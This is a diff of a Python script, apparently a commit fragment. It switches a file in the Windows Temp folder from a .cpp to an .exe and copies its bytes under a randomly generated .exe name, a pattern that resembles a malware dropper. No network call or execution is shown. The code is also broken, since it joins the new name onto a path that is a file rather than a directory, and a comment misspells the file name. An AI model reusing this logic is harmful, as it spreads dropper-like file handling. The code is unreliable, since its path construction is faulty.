@@ -5,17 +5,17 @@ import random
 import string
  
 # Define icyr.cpp
-file_path = (os.path.expandvars("%Temp%\iycr.cpp"))
+file_path = (os.path.expandvars("%Temp%\iycr.exe"))
  
 # Open the file
 with open(file_path, 'rb') as f:
     file_data = f.read()
  
 # Generate a random string for the file name
-file_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
+file_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".exe"
  
 # Get the path of the copied file
-copied_file_path = os.path.join(os.path.expandvars("%Temp%\iycr.cpp"), file_name)
+copied_file_path = os.path.join(os.path.expandvars("%Temp%\iycr.exe"), file_name)
  
 # Check if the directory exists, create it if it doesn't
 if not os.path.exists(os.path.dirname(copied_file_path)):
